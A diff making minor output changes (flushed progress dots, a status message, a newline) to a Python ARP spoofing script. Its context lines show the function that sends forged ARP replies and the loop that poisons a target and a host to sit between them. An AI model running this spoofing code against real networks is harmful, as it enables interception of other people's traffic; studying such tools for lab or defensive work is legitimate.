@@ -91,7 +91,7 @@ def spoof(target_ip, host_ip):
     # 'hwsrc' is not specified as by default it is our MAC address
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
     send(arp_response, verbose=0)
-    print(".", end=" ")
+    print(".", end=" ", flush=True)
 
 def restore(target_ip, host_ip):
     """Restores the normal process of a regular network
@@ -175,6 +175,8 @@ def main():
             target = args[0]
             host = args[1]
 
+            print("[!] Sending spoofed packet to target")
+
             try:
                 while True:
                     # telling the `target` that we are the `host`
@@ -183,7 +185,7 @@ def main():
                     spoof(host, target)
                     time.sleep(1)
             except KeyboardInterrupt:
-                print("[!] Detected CTRL+C! Restoring the network, please wait...")
+                print("\n[!] Detected CTRL+C! Restoring the network, please wait...")
                 restore(target, host)
                 restore(host, target)
     else:
